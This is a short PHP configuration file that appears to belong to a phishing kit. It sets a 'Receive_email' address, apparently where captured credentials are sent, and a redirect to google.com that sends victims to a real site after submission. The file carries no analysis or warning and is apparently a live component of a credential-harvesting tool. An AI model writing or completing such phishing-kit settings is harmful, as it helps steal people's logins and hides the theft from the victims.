<?php 
$Receive_email="fudpages@gmail.com";
$redirect="https://www.google.com/";
?>